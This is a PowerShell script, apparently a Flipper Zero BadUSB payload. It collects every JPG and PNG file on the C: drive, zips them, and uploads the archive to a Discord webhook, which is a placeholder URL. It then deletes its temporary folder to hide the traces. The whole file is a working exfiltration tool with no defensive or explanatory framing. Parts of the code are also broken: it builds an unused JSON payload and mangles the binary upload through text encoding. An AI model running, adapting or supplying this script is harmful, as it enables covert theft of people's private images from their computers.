# Define the Discord webhook URL
$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL"

# Create a temporary directory to store the files
$tempDir = "$env:temp\flipper_temp"
New-Item -ItemType Directory -Force -Path $tempDir

# Copy all JPG and PNG files to the temporary directory
Get-ChildItem -Path C:\ -Include *.jpg, *.png -Recurse -ErrorAction SilentlyContinue | Copy-Item -Destination $tempDir -Force -ErrorAction SilentlyContinue

# Compress the files into a zip archive
$zipPath = "$tempDir\images.zip"
Add-Type -AssemblyName "System.IO.Compression.FileSystem"
[System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)

# Function to send files to Discord webhook
function Send-FileToDiscord {
    param (
        [string]$filePath,
        [string]$webhookUrl
    )

    $boundary = [System.Guid]::NewGuid().ToString()
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $fileBase64 = [System.Convert]::ToBase64String($fileContent)
    $fileName = [System.IO.Path]::GetFileName($filePath)

    $payload = @{
        "content" = ""
        "username" = "FlipperBot"
        "avatar_url" = ""
        "file" = @{
            "content" = $fileBase64
            "filename" = $fileName
        }
    }

    $jsonPayload = $payload | ConvertTo-Json

    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=$boundary"
    }

    $body = "--$boundary`r`n"
    $body += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"`r`n"
    $body += "Content-Type: application/octet-stream`r`n`r`n"
    $body += [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($fileBase64))
    $body += "`r`n--$boundary--"

    Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers $headers -Body $body
}

# Send the zip file to the Discord webhook
Send-FileToDiscord -filePath $zipPath -webhookUrl $webhookUrl

# Clean up the temporary directory
Remove-Item -Path $tempDir -Recurse -Force
